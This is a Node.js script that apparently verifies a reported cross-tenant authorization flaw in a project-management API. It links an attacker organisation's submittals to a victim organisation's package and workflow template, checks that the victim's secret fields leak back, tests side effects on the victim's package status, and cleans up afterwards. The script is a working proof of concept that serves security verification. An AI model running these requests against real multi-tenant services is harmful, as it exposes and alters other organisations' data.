'use strict';
// Independent check of L8 (scratch). Controls + consequences the claimant's script does not test.
const crypto = require('crypto');
const { as, signIn } = require('../../lib/api');
const { ATTACKER, VICTIM } = require('../_fib-constants');
const j = (v) => JSON.stringify(v);
const listOf = (d) => (Array.isArray(d) ? d : d?.items || d?.rows || d?.data || []);
const err = (r) => (r.body?.error ? `${r.body.error.code}: ${r.body.error.message}` : '');
const mail = (who, code) => `${who}@c${code}.octapm-cert.test`;

(async () => {
  const A = as(ATTACKER.pm, ATTACKER.orgId);
  const V = as(VICTIM.pm, VICTIM.orgId);
  const AP = `/projects/${ATTACKER.project}/submittals`;
  const VP = `/projects/${VICTIM.project}/submittals`;

  // [0] are these really two companies?
  const sa = await signIn(ATTACKER.pm, ATTACKER.orgId);
  const sv = await signIn(VICTIM.pm, VICTIM.orgId);
  console.log(`[0] attacker session org=${sa.orgId} user=${sa.user?.email}; victim session org=${sv.orgId} user=${sv.user?.email}; same org? ${sa.orgId === sv.orgId}`);
  const aProjects = listOf((await A.send('GET', '/projects')).body?.data).map((p) => p.id);
  const vProjects = listOf((await V.send('GET', '/projects')).body?.data).map((p) => p.id);
  console.log(`[0] attacker project in victim's list? ${vProjects.includes(ATTACKER.project)}; victim project in attacker's list? ${aProjects.includes(VICTIM.project)}`);

  // victim fixtures
  const tag = crypto.randomBytes(3).toString('hex');
  const pkg = (await V.send('POST', `${VP}/packages`, { name: `L8-check secret package ${tag}`, description: `secret description ${tag}` })).body.data;
  const tpl = (await V.send('POST', `${VP}/workflow-templates`, { name: `L8-check secret route ${tag}`, steps: [{ name: `secret step ${tag}`, mode: 'sequential', days: 13, assignees: [{ type: 'role', role: 'pm' }] }] })).body.data;
  const vsub = (await V.send('POST', VP, { title: `L8-check victim own item ${tag}` })).body.data;
  console.log(`[1] victim package ${pkg.id} ${pkg.ref} status=${pkg.status}; template ${tpl.id}; own submittal ${vsub.id} ${vsub.ref}`);

  // [2] controls: the attacker cannot read these the honest way
  const c1 = await A.send('GET', `${VP}/packages/${pkg.id}`);
  const c2 = await A.send('GET', `${AP}/packages/${pkg.id}`);
  const c3 = await A.send('GET', `${VP}/packages`);
  const c4 = await A.send('GET', `${AP}/workflow-templates?scope=all&includeArchived=true`);
  console.log(`[2] attacker GET victim-project package -> ${c1.status} ${err(c1)}`);
  console.log(`[2] attacker GET own-project/packages/<victim id> -> ${c2.status} ${err(c2)}`);
  console.log(`[2] attacker GET victim-project packages list -> ${c3.status} ${err(c3)}`);
  console.log(`[2] attacker's own template list mentions victim template? ${String(c4.text).includes(tpl.id)} (status ${c4.status})`);

  // [3] is the field really stored (FK-checked), or silently ignored?
  const sub = (await A.send('POST', AP, { title: `L8-check attacker item ${tag}` })).body.data;
  const ghost = crypto.randomUUID();
  const g1 = await A.send('PATCH', `${AP}/${sub.id}`, { packageId: ghost });
  const g2 = await A.send('PATCH', `${AP}/${sub.id}`, { workflowTemplateId: ghost });
  console.log(`[3] PATCH packageId=<non-existent uuid> -> ${g1.status} ${err(g1)}`);
  console.log(`[3] PATCH workflowTemplateId=<non-existent uuid> -> ${g2.status} ${err(g2)}`);

  // [4] the attack, PATCH path
  const p = await A.send('PATCH', `${AP}/${sub.id}`, { packageId: pkg.id, workflowTemplateId: tpl.id });
  const got = (await A.send('GET', `${AP}/${sub.id}`)).body?.data;
  console.log(`[4] PATCH {victim packageId, victim templateId} -> ${p.status} ${err(p)}`);
  console.log(`[4] attacker GET submittal.package=${j(got?.package)} workflowTemplate=${j(got?.workflowTemplate)}`);
  const leakedText = j(got);
  console.log(`[4] attacker response contains: package description? ${leakedText.includes(`secret description ${tag}`)}; step name? ${leakedText.includes(`secret step ${tag}`)}`);

  // [4b] the create path
  const sub2r = await A.send('POST', AP, { title: `L8-check attacker item via create ${tag}`, packageId: pkg.id, workflowTemplateId: tpl.id });
  const sub2 = sub2r.body?.data;
  console.log(`[4b] POST submittal {victim packageId, victim templateId} -> ${sub2r.status} ${err(sub2r)} packageId=${sub2?.packageId}`);

  // [4c] attacker's own list filter by the victim's package id
  const lf = await A.send('GET', `${AP}?packageId=${pkg.id}`);
  console.log(`[4c] attacker list ?packageId=<victim> -> ${lf.status} rows=${listOf(lf.body?.data).length}`);

  // [5] victim's view
  const v1 = (await V.send('GET', `${VP}/packages/${pkg.id}`)).body?.data;
  console.log(`[5] victim GET package: status=${v1?.status} items=${j((v1?.items || []).map((i) => ({ id: i.id, ref: i.ref, title: i.title, status: i.status })))} summary=${j(v1?.summary)}`);

  // [6] does the foreign item change the victim's STORED package status?
  const ur = await A.send('PATCH', `${AP}/${sub.id}`, { status: 'under_review' });
  console.log(`[6] attacker PATCH own submittal status=under_review -> ${ur.status} ${err(ur)} status=${ur.body?.data?.status}`);
  const aAfter = (await A.send('GET', `${AP}/${sub.id}`)).body?.data;
  console.log(`[6] attacker submittal after: status=${aAfter?.status} reviewSteps=${(aAfter?.reviewSteps || []).length} (a route from the foreign template started? ${(aAfter?.reviewSteps || []).length > 0}) submitBy=${aAfter?.submitBy}`);
  const add = await V.send('POST', `${VP}/packages/${pkg.id}/items`, { submittalIds: [vsub.id] });
  console.log(`[6] victim adds its own PENDING submittal -> ${add.status} ${err(add)} package.status=${add.body?.data?.status} summary=${j(add.body?.data?.summary)}`);
  const stored = listOf((await V.send('GET', `${VP}/packages`)).body?.data).find((x) => x.id === pkg.id);
  console.log(`[6] victim package list: stored status=${stored?.status} (the victim's only own item is pending; "submitted" comes from the foreign item)`);

  // [7] package actions by the victim over the foreign members
  const sp = await V.send('POST', `${VP}/packages/${pkg.id}/submit`, {});
  console.log(`[7] victim submit package -> ${sp.status} results=${j(sp.body?.data?.results)}`);
  const dp = await V.send('POST', `${VP}/packages/${pkg.id}/decide`, { decision: 'approve' });
  console.log(`[7] victim decide package -> ${dp.status} results=${j(dp.body?.data?.results)}`);
  const aAfter2 = (await A.send('GET', `${AP}/${sub.id}`)).body?.data;
  console.log(`[7] attacker submittal after victim's decide: status=${aAfter2?.status}`);

  // [8] same org, other project
  const own2 = await A.send('POST', `/projects/${ATTACKER.project2}/submittals/packages`, { name: `L8-check 028 project-2 package ${tag}` });
  const x = await A.send('PATCH', `${AP}/${sub2?.id}`, { packageId: own2.body?.data?.id });
  const x2 = (await A.send('GET', `/projects/${ATTACKER.project2}/submittals/packages/${own2.body?.data?.id}`)).body?.data;
  console.log(`[8] same org: PATCH project-1 submittal into project-2 package -> ${x.status} ${err(x)}; project-2 package items=${j((x2?.items || []).map((i) => i.ref))}`);

  // [9] which other 028 people can do it
  for (const who of ['site', 'qs', 'quality', 'finance', 'planner']) {
    try {
      const r = await as(mail(who, '028')).send('PATCH', `${AP}/${sub2.id}`, { packageId: pkg.id });
      console.log(`[9] ${who}@c028 PATCH {victim packageId} -> ${r.status} ${err(r)}`);
    } catch (e) { console.log(`[9] ${who}@c028: ${e.message.slice(0, 120)}`); }
  }

  // [10] cleanup — unlink first (archiving alone leaves the foreign row inside the victim's package)
  const rm1 = await V.send('DELETE', `${VP}/packages/${pkg.id}/items/${sub.id}`);
  console.log(`[10] victim removes the foreign item from its package -> ${rm1.status} ${err(rm1)}`);
  const un2 = await A.send('PATCH', `${AP}/${sub2.id}`, { packageId: null, workflowTemplateId: null });
  const un1 = await A.send('PATCH', `${AP}/${sub.id}`, { packageId: null, workflowTemplateId: null, status: 'pending' });
  console.log(`[10] attacker unlinks -> ${un1.status} ${un2.status}`);
  await A.send('DELETE', `${AP}/${sub.id}`);
  await A.send('DELETE', `${AP}/${sub2.id}`);
  await V.send('DELETE', `${VP}/packages/${pkg.id}/items/${vsub.id}`);
  await V.send('DELETE', `${VP}/${vsub.id}`);
  await V.send('DELETE', `${VP}/workflow-templates/${tpl.id}`);
  const fin = (await V.send('GET', `${VP}/packages/${pkg.id}`)).body?.data;
  console.log(`[10] victim package at the end: status=${fin?.status} items=${(fin?.items || []).length}`);

  // [11] residue left in 042 by earlier runs of the claimant's script (archived but still linked)
  const vSubIds = new Set();
  let cursor = null;
  for (let i = 0; i < 20; i += 1) {
    const page = (await V.send('GET', `${VP}?includeArchived=true&limit=100${cursor ? `&cursor=${cursor}` : ''}`)).body?.data;
    for (const r of listOf(page)) vSubIds.add(r.id);
    cursor = page?.pagination?.nextCursor;
    if (!cursor) break;
  }
  for (const pk of listOf((await V.send('GET', `${VP}/packages`)).body?.data)) {
    const foreign = (pk.items || []).filter((it) => !vSubIds.has(it.id));
    if (foreign.length) console.log(`[11] 042 package ${pk.ref} ${pk.id} "${pk.name}" still holds foreign items: ${j(foreign.map((f) => ({ id: f.id, ref: f.ref, status: f.status })))}`);
  }
})().catch((e) => { console.error('ERROR', e.stack || e.message); process.exitCode = 1; });
